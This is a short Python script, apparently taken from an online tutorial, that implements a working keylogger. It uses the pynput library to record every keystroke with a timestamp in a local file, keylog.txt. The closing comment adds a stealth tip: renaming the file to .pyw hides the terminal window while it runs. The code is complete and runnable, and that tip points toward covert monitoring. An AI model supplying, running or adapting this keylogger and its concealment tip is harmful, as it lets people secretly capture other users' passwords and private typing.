#sourced from Debjeet Banerjee https://www.askpython.com/python/examples/python-keylogger#:~:text=Creating%20a%20Python%20Keylogger%20in%2010%20Lines%20of,Running%20our%20Python%20Keylogger%20...%206%20Conclusion%20

#importing libraries
from pynput.keyboard import Key, Listener
import logging

#configuration of logging system - filename and format YY-MM-DD HH-MM-SS - KEY
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

#argument = key pressed -> convert to string and logs into logfile
def on_press(key):
    logging.info(str(key))
#test
#instance of Listener records key strokes and passes the function on_press as an argument. 
#then we use .join method to join it to the main thread?
#Every time a key is pressed, listener is triggered and calls our function which logs keystrokes into the file
with Listener(on_press=on_press) as listener :
    listener.join()

#to add a wee bit of stealth, rename the extension to pyw to open the file without terminal showing up.